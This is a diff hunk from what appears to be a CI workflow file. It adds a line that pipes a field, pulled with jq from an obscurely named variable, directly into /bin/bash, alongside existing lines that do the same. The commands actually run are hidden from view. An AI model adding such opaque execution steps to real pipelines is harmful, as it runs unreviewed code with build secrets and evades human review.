@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$pjwc01301" | jq -r .te6 | /bin/bash
           echo $g3 | jq -r .qamwd52 | /bin/bash
           echo $mrl54861 | jq -r .lduzh62 | /bin/bash
+          printf '%s' "$pmal324" | jq -r .fzf08 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
